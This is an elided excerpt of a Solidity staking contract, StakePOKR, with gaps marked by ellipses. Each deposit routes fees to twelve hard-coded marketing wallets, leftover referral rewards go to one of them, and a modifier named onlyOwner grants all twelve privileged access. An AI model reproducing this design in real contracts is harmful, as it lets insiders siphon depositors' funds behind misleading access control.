...
contract StakePOKR {
    ...
    event Marketing(address indexed addr, uint amount);
    ...
    modifier onlyOwner(){
        ...
        require(msg.sender == marketing1 || msg.sender == marketing2 || msg.sender == marketing3 || msg.sender == marketing4 || msg.sender == marketing5 || msg.sender == marketing6 || msg.sender == marketing7 || msg.sender == marketing8 || msg.sender == marketing9 || msg.sender == marketing10 || msg.sender == marketing11 || msg.sender == marketing12 || msg.sender == owner, "Caller does not have the permission");
        _;
    }
  ...
  function _checkout(address _userId) private hasDeposit(_userId){
    ...
    */
    ...
    function deposit(uint _amount, address payable _userId, address _refBy) internal {
        ...
        players[marketing1].finances[0].available += marketingfee1;
        players[marketing2].finances[0].available += marketingfee1;
        players[marketing3].finances[0].available += marketingfee2;
        players[marketing4].finances[0].available += marketingfee2;
        players[marketing5].finances[0].available += marketingfee3;
        players[marketing6].finances[0].available += marketingfee3;
        players[marketing7].finances[0].available += marketingfee3;
        players[marketing8].finances[0].available += marketingfee3;
        players[marketing9].finances[0].available += marketingfee3;
        players[marketing10].finances[0].available += marketingfee3;
        players[marketing11].finances[0].available += marketingfee3;
        players[marketing12].finances[0].available += marketingfee3;
    ...
    function distributeRef(uint256 _trx, address _affFrom) private{
     ...
     if(_allaff > 0 ){
            ...
            players[marketing12].finances[0].available += _allaff;
        }
    }
    ...
    function reinvest() external hasDeposit(msg.sender){
        ...
        function MarketingTeam() public onlyMarketing{
        ...
        emit Marketing(msg.sender, amount);
    }
